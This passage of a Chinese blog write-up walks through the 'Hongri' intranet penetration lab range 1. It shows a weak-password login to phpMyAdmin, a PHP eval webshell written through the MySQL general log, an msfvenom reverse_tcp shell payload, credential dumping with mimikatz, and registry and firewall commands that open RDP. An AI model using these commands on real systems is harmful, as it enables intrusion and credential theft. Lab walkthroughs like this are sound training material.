@@ -1,0 +1,1381 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="1.环境搭建 参考以下文章,不做过多叙述\n&lt;https://blog.csdn.net/m0_46363249/article/details/121441832\n2.拓扑图和机器信息 3.打点 端口扫描发现80站点和3306mysql服务\n访问http发现phpstudy探针\n使用hydra发现无法连接\n">
+<title>红日内网靶场1</title>
+
+<link rel='canonical' href='http://gucheng.me/p/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="红日内网靶场1">
+<meta property='og:description' content="1.环境搭建 参考以下文章,不做过多叙述\n&lt;https://blog.csdn.net/m0_46363249/article/details/121441832\n2.拓扑图和机器信息 3.打点 端口扫描发现80站点和3306mysql服务\n访问http发现phpstudy探针\n使用hydra发现无法连接\n">
+<meta property='og:url' content='http://gucheng.me/p/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/'>
+<meta property='og:site_name' content='gucheNg'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-12-08T12:19:00&#43;08:00'/><meta property='article:modified_time' content='2024-12-08T12:19:00&#43;08:00'/>
+<meta name="twitter:title" content="红日内网靶场1">
+<meta name="twitter:description" content="1.环境搭建 参考以下文章,不做过多叙述\n&lt;https://blog.csdn.net/m0_46363249/article/details/121441832\n2.拓扑图和机器信息 3.打点 端口扫描发现80站点和3306mysql服务\n访问http发现phpstudy探针\n使用hydra发现无法连接\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu16238301693240277511.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">gucheNg</a></h1>
+            <h2 class="site-description">欢迎来到我的博客，偶尔会分享一些关于CTF和渗透的东西，摸鱼选手一枚.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/1778687393'
+                        target="_blank"
+                        title="bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://blog.csdn.net/weixin_73399382'
+                        target="_blank"
+                        title="csdn"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1725886844926" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4556" width="32" height="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M530.9293681 431.99298667c12.69089853-1.39850077 32.17241993-2.81598184 58.96997255-2.81598184 44.75202505 0 80.92755642 7.8957922 103.33549032 24.51560657 20.13547797 15.48790009 33.52519552 40.55565997 29.81627827 76.89597458-3.43197786 33.81076231-20.74198383 57.48864879-45.99437 72.12071127C653.95861373 616.52261991 624.87825229 622.43066023 581.11147578 622.43066023c-25.78555916 0-50.402969-1.41748106-69.11147578-4.22397275l18.9293681-186.21370082z m36.98564379 149.2013121c4.29730562 0.85583762 9.97499448 1.70218509 21.16558896 1.7021851 44.76151521 0 76.3265665-22.32511089 79.51007536-53.69690853 4.60098993-45.34127616-23.40180983-61.20619343-70.57468202-60.93011679-6.10129397 0-14.59496468 0-19.09501409 0.83685734L567.90552174 581.20378891h0.0086274z m192.82056016-142.09665206c181.99921821-34.39915066 197.70797962 27.4144114 192.08550608 82.12331343L942.21024461 622.43066023h-57.75523531l9.67131017-92.30191443c2.08955515-20.32786888 15.10225553-60.09239669-47.74228028-58.59209265-21.7272324 0.52454563-32.53131957 3.50617346-32.53131957 3.50617347s-1.88594862 24.56133176-4.16875743 42.71768524L798.70560163 622.43066023h-56.64143855l11.23631967-103.16035419" fill="#231916" p-id="4557"></path><path d="M265.80433314 616.11799508c-10.67553898 3.74515232-32.81688637 6.31266516-63.76507889 6.31266515C113.06923991 622.43066023 65.05951037 580.09861956 70.72857184 524.15600002c6.80960313-66.67251112 77.93643846-104.18183779 155.82628898-104.18183779 30.17517791 0 47.92690654 2.46657234 64.58381871 6.58960456l-5.35588702 44.91767104c-11.06118355-3.78225011-37.00289858-7.25218852-58.00370429-7.25218852-45.84684153 0-84.76415912 13.84093033-89.22797347 57.59907945-3.97550376 39.12955153 23.3465945 57.8380583 74.89959531 57.8380583 17.94498229 0 44.41124294-2.60461066 56.64143856-6.35839035l-4.30679575 42.79188083 0.01898028 0.01725479z" fill="#C92027" p-id="4558"></path><path d="M305.55937083 570.68440578c16.63793189 5.83470746 51.32264935 11.65043465 79.37203705 11.65043465 30.2209031 0 47.04346126-8.05194806 48.39623685-20.53061266 1.22336465-11.39247553-11.15349668-12.92987738-45.28606084-20.71437619-47.16338205-11.12675175-77.25573697-28.3349545-74.3103442-55.82356149C317.17270769 453.32508436 361.6115583 429.17700483 429.80249098 429.17700483c33.26723639 0 65.49487164 2.25433839 82.19750902 7.51877503l-5.74239433 40.26060304c-10.84032224-3.62523151-52.34413295-8.65931669-80.41163819-8.65931669-28.46350268 0-43.19736842 8.60410136-44.21885202 18.04592281-1.28807011 11.94549158 13.50963835 12.49764488 50.49441939 21.95758387 50.06218689 12.2120781 71.95506527 29.41079069 69.09335825 56.07116773C497.85538535 595.77977332 457.87085896 622.43066023 378.02949161 622.43066023c-33.23962873 0-61.89638506-5.83470746-77.68796948-11.66855218l5.21784869-40.07770228z" fill="#231916" p-id="4559"></path></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/2477231995/'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#1环境搭建">1.环境搭建</a></li>
+        <li><a href="#2拓扑图和机器信息">2.拓扑图和机器信息</a></li>
+        <li><a href="#3打点">3.打点</a></li>
+        <li><a href="#4内网渗透">4.内网渗透</a>
+          <ol>
+            <li><a href="#41-使用proxychains代理">4.1 使用proxychains代理:</a></li>
+            <li><a href="#42-cs直接建立socks5代理">4.2 CS直接建立socks5代理</a></li>
+            <li><a href="#43-渗透同域主机19216852141">4.3 渗透同域主机192.168.52.141</a></li>
+            <li><a href="#44-打域控">4.4 打域控</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/">红日内网靶场1</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2024-12-08</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h3 id="1环境搭建">1.环境搭建
+</h3><p>参考以下文章,不做过多叙述</p>
+<p>&lt;https://blog.csdn.net/m0_46363249/article/details/121441832</p>
+<hr>
+<h3 id="2拓扑图和机器信息">2.拓扑图和机器信息
+</h3><p><img src="/img/%e7%bb%98%e5%9b%be2.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="img"
+	
+	
+></p>
+<p><img src="/img/image-20241208122350101.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208122350101"
+	
+	
+></p>
+<hr>
+<h3 id="3打点">3.打点
+</h3><p>端口扫描发现80站点和3306mysql服务</p>
+<p><img src="/static/img/image-20241208142541944.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208142541944"
+	
+	
+></p>
+<p>访问http发现phpstudy探针</p>
+<p><img src="/static/img/image-20241208142628629.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208142628629"
+	
+	
+></p>
+<p>使用hydra发现无法连接</p>
+<p><img src="/static/img/image-20241208142912387.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208142912387"
+	
+	
+></p>
+<p>截包尝试爆破发现一个异常长度</p>
+<p><img src="/static/img/image-20241208143525512.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208143525512"
+	
+	
+></p>
+<p>返回包看不出什么,到web界面手动输入root,root发现连接正常说明存在弱口令root/root</p>
+<p><img src="/static/img/image-20241208143542310.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208143542310"
+	
+	
+></p>
+<p>尝试连接发现不允许从外部连接</p>
+<p><img src="/static/img/image-20241208143801745.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208143801745"
+	
+	
+></p>
+<p>掏出82年的笔记,按理说phpstudy搭建应该有phpadmin</p>
+<p><img src="/static/img/image-20241208143857821.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208143857821"
+	
+	
+></p>
+<p>访问路径发现的确存在</p>
+<p><img src="/static/img/image-20241208143958943.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208143958943"
+	
+	
+></p>
+<p>使用弱口令root/root成功进入</p>
+<p><img src="/static/img/image-20241208144044408.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208144044408"
+	
+	
+></p>
+<p>发现是能够执行sql语句的</p>
+<p><img src="/static/img/image-20241208144514164.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208144514164"
+	
+	
+></p>
+<p>接下来我们尝试利用mysql 写入webshell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#mysql写入webshell需要的条件
+</span></span><span class="line"><span class="cl">1.mysql用户为root或dba赋权较高用户
+</span></span><span class="line"><span class="cl">2.有写入权限(FILE)
+</span></span><span class="line"><span class="cl">3.知道网站的绝对路径
+</span></span><span class="line"><span class="cl">4.服务器配置secure_file_priv
+</span></span><span class="line"><span class="cl">该选项为空代表可以写入任何目录
+</span></span><span class="line"><span class="cl">该选项如果有目录则代表只允许写入该目录下文件
+</span></span><span class="line"><span class="cl">该选项为null代表没有权限
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查询&quot;secure_file_priv&quot;</p>
+<p><img src="/static/img/image-20241208144950595.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208144950595"
+	
+	
+></p>
+<p>发现为null就是没有写入权限</p>
+<p><img src="/static/img/image-20241208145019777.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208145019777"
+	
+	
+></p>
+<p>查询一下日志功能,尝试利用日志getshell</p>
+<p><img src="/static/img/image-20241208151454482.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208151454482"
+	
+	
+></p>
+<p>关闭了但是我们可以手动开启,输入sql语句<code>SET GLOBAL general_log = ON;</code>执行成功开启</p>
+<p><img src="/static/img/image-20241208151634306.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208151634306"
+	
+	
+></p>
+<p>我这里偷窥了一下站点目录,这个应该记住!</p>
+<p><img src="/static/img/image-20241208151917953.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208151917953"
+	
+	
+></p>
+<p>接下来的思路是设置日志文件写到一个php文件中,<code>SET GLOBAL general_log_file = 'C:/phpstudy/WWW/test.php';</code></p>
+<p><img src="/static/img/image-20241208160931473.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208160931473"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#这里前面不能加@
+</span></span><span class="line"><span class="cl">select &#39;&lt;?php eval($_POST[gucheng]);?&gt;&#39;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/static/img/image-20241208161435113.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208161435113"
+	
+	
+></p>
+<p><img src="/static/img/image-20241208162418255.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208162418255"
+	
+	
+></p>
+<p>进来后发现还有个网站yxcms,我们练习都打一下</p>
+<p><img src="/static/img/image-20241208164539137.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208164539137"
+	
+	
+></p>
+<p>棱洞扫了下发现这cms就叫这个</p>
+<p><img src="/static/img/image-20241208165056769.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208165056769"
+	
+	
+></p>
+<p>查看网页源代码发现默认口令</p>
+<p><img src="/static/img/image-20241208165525343.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208165525343"
+	
+	
+></p>
+<p>到指定路径输入默认口令成功登入,修改模版index_index.php</p>
+<p><img src="/static/img/image-20241208170152404.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208170152404"
+	
+	
+></p>
+<p>写入一句马</p>
+<p><img src="/static/img/image-20241208170701742.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208170701742"
+	
+	
+></p>
+<p>蚁剑成功连接</p>
+<p><img src="/static/img/image-20241208170809940.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208170809940"
+	
+	
+></p>
+<hr>
+<h3 id="4内网渗透">4.内网渗透
+</h3><p>之前一直内网手渗透,下面就用cs操作了,主要是内网信息收集插件方便点</p>
+<p>将生成马上传到站点目录下运行上线</p>
+<p><img src="/static/img/image-20241208184123955.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208184123955"
+	
+	
+></p>
+<p>ladon插件 icmp检测主机存活一致</p>
+<p><img src="/static/img/image-20241208185403956.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208185403956"
+	
+	
+></p>
+<p>发现存在域环境,域名为god.org</p>
+<p><img src="/static/img/image-20241208193501834.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208193501834"
+	
+	
+></p>
+<p>ladon infoscan整个网段确实如此</p>
+<p><img src="/static/img/image-20241208193607344.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208193607344"
+	
+	
+></p>
+<p>现在是administrator权限,可以尝试提到system权限</p>
+<p><img src="/static/img/image-20241208194301195.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208194301195"
+	
+	
+></p>
+<p>上传个nc到c:\windows\temp目录</p>
+<p><img src="/static/img/image-20241208194237316.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208194237316"
+	
+	
+></p>
+<p>弹过来没反应</p>
+<p><img src="/static/img/image-20241208200518356.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208200518356"
+	
+	
+></p>
+<p>mimikatz抓取到密码</p>
+<p><img src="/static/img/image-20241208200318243.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208200318243"
+	
+	
+></p>
+<p>尝试用psexec连接也不行</p>
+<p><img src="/static/img/image-20241208202630995.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208202630995"
+	
+	
+></p>
+<p>查看一下系统信息,打了什么补丁</p>
+<p><img src="/static/img/image-20241208202537197.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208202537197"
+	
+	
+></p>
+<p>使用梼杌中的ms14-058提权成功</p>
+<p><img src="/static/img/image-20241208204847821.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208204847821"
+	
+	
+></p>
+<p><img src="/static/img/image-20241208202805154.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241208202805154"
+	
+	
+></p>
+<p>上面搞的好像是有点问题,Windows应该是3389远程桌面连接,重新搞下</p>
+<p>执行netstat -ano未发现3389端口开启</p>
+<p><img src="/static/img/image-20241209133742373.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209133742373"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">通过以下命令查询注册表来查看 RDP 服务是否开启：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">REG QUERY &#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&#34; /v fDenyTSConnections    
+</span></span><span class="line"><span class="cl"># 查看RDP服务是否开启: 1关闭, 0开启 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">REG QUERY &#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\ WinStations\RDP-Tcp&#34; /v PortNumber    # 查看 RDP 服务的端口
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>为1关闭</p>
+<p><img src="/static/img/image-20241209135458399.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209135458399"
+	
+	
+></p>
+<p>使用命令<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code>手动开启</p>
+<p>为0成功开启</p>
+<p><img src="/static/img/image-20241209135700721.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209135700721"
+	
+	
+></p>
+<p>再使用命令配置一下防火墙允许连接</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netsh advfirewall firewall add rule name=&#34;Remote Desktop&#34; protocol=TCP dir=in localport=3389 action=allow
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/static/img/image-20241209141144583.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209141144583"
+	
+	
+></p>
+<p>接下来可以使用kali自带的xfreerdp进行连接,我这里为了后期渗透方便选择msf的</p>
+<p>先使用msfvenom组件生成一个马</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.52.128 lport=4444 -f exe -o /root/Desktop/shell.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>传上去执行后拿到meterpreter会话</p>
+<p><img src="/static/img/image-20241209143251537.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209143251537"
+	
+	
+></p>
+<p><img src="/static/img/image-20241209143532781.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209143532781"
+	
+	
+></p>
+<p>提权到system</p>
+<p><img src="/static/img/image-20241209143942740.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209143942740"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">run post/windows/manage/enable_rdp #开启远程桌面
+</span></span><span class="line"><span class="cl">会生成一个文件，该文件可用来 再关闭远程桌面
+</span></span><span class="line"><span class="cl">run multi_console_command -r 文件地址
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接下来做域内信息收集准备横向</p>
+<p>输入net view发现另外两台主机</p>
+<p><img src="/static/img/image-20241209132456126.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209132456126"
+	
+	
+></p>
+<p><img src="/static/img/image-20241209153323049.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209153323049"
+	
+	
+></p>
+<p>汇总一下信息</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">域名:god.org
